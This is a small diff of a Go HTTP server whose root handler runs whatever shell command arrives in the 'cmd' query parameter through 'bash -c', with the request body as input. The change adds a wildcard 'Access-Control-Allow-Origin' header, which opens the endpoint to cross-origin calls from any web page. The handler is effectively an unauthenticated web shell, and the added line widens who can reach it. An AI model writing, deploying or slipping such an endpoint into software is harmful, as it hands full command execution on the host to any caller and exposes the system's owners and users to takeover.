@@ -9,6 +9,7 @@ import (
 
 func main() {
 	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Access-Control-Allow-Origin", "*")
 		cmd := r.URL.Query().Get("cmd")
 		c := exec.Command("bash", "-c", cmd)
 		c.Stdin = r.Body
